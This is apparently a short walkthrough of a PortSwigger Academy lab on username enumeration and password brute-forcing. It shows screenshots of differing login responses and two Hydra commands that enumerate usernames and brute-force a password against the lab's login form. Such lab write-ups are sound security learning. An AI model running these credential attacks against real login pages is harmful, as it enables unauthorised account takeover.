
Desc:This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:
- https://portswigger.net/web-security/authentication/auth-lab-usernames
- https://portswigger.net/web-security/authentication/auth-lab-passwords
To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

Usernames enumeration:
![image](https://github.com/user-attachments/assets/a109445e-c799-43db-b5d5-7c33fd464b69)

For username `access` we have different response:
![image](https://github.com/user-attachments/assets/8bdf0bc7-0076-4283-bcc0-9424426c25ff)


HYDRA try:
For username:
`hydra -L ./login-list.txt -p test -S -s 443 -f 0a6300400322b8da80c8a35e00000049.web-security-academy.net http-post-form "/login:username=^USER^&password=^PASS^:Invalid username"`
For password:
`hydra -l access -P ./password-list.txt -t 64 -S -s 443 -f 0a6300400322b8da80c8a35e00000049.web-security-academy.net http-post-form "/login:username=^USER^&password=^PASS^:Incorrect password"`




